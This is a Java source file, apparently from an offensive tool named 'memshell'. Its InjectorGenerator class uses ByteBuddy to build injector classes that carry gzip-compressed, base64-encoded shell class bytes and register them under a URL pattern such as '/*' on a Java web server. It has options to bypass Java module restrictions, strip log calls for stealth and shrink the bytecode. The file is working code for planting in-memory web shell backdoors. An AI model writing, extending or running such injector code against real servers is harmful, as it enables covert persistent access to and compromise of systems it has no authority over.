package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.ClassBytesShrink;
import com.reajason.javaweb.asm.InnerClassDiscovery;
import com.reajason.javaweb.buddy.*;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.utils.CommonUtil;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.description.type.TypeDescription;
import net.bytebuddy.dynamic.ClassFileLocator;
import net.bytebuddy.dynamic.DynamicType;
import net.bytebuddy.dynamic.scaffold.TypeValidation;
import net.bytebuddy.implementation.FixedValue;
import net.bytebuddy.pool.TypePool;
import org.apache.commons.codec.binary.Base64;

import java.util.*;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/24
 */
public class InjectorGenerator {
    private final ShellConfig shellConfig;
    private final InjectorConfig injectorConfig;

    public InjectorGenerator(ShellConfig shellConfig, InjectorConfig injectorConfig) {
        this.shellConfig = shellConfig;
        this.injectorConfig = injectorConfig;
    }

    @SneakyThrows
    public DynamicType.Builder<?> getBuilder() {
        String base64String = Base64.encodeBase64String(CommonUtil.gzipCompress(injectorConfig.getShellClassBytes()));
        String originalClassName = injectorConfig.getInjectorClass().getName();
        String newClassName = injectorConfig.getInjectorClassName();

        DynamicType.Builder<?> builder = new ByteBuddy()
                .redefine(injectorConfig.getInjectorClass())
                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                .visit(new ClassRenameVisitorWrapper(originalClassName, newClassName))
                .method(named("getUrlPattern")).intercept(FixedValue.value(Objects.toString(injectorConfig.getUrlPattern(), "/*")))
                .method(named("getBase64String")).intercept(FixedValue.value(base64String))
                .method(named("getClassName")).intercept(FixedValue.value(injectorConfig.getShellClassName()));

        if (shellConfig.needByPassJavaModule()) {
            builder = ByPassJavaModuleInterceptor.extend(builder);
        }

        if (shellConfig.isJakarta()) {
            builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
        }

        if (shellConfig.isDebugOff()) {
            builder = LogRemoveMethodVisitor.extend(builder);
        }
        return builder;
    }

    @SneakyThrows
    public Map<String, byte[]> getInnerClassBytes() {
        Set<String> innerClassNames = InnerClassDiscovery.findAllInnerClasses(injectorConfig.getInjectorClass());
        if (innerClassNames.isEmpty()) {
            return Collections.emptyMap();
        }

        String originalClassName = injectorConfig.getInjectorClass().getName();
        String newClassName = injectorConfig.getInjectorClassName();

        ClassFileLocator classFileLocator = ClassFileLocator.ForClassLoader.of(injectorConfig.getInjectorClass().getClassLoader());
        TypePool typePool = TypePool.Default.of(classFileLocator);

        Map<String, byte[]> bytes = new HashMap<>();
        for (String innerClassName : innerClassNames) {
            TypeDescription innerTypeDesc = typePool.describe(innerClassName).resolve();
            String newInnerClassName = innerClassName.replace(originalClassName, newClassName);
            DynamicType.Builder<?> innerBuilder = new ByteBuddy()
                    .with(TypeValidation.DISABLED)
                    .redefine(innerTypeDesc, classFileLocator)
                    .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
                    .visit(new ClassRenameVisitorWrapper(originalClassName, newClassName));

            try (DynamicType.Unloaded<?> unloaded = innerBuilder.make()) {
                for (Map.Entry<TypeDescription, byte[]> entry : unloaded.getAllTypes().entrySet()) {
                    bytes.put(newInnerClassName, entry.getValue());
                }
            }
        }
        return bytes;
    }

    @SneakyThrows
    public byte[] generate() {
        DynamicType.Builder<?> builder = getBuilder();
        try (DynamicType.Unloaded<?> make = builder.make()) {
            return ClassBytesShrink.shrink(make.getBytes(), shellConfig.isShrink());
        }
    }
}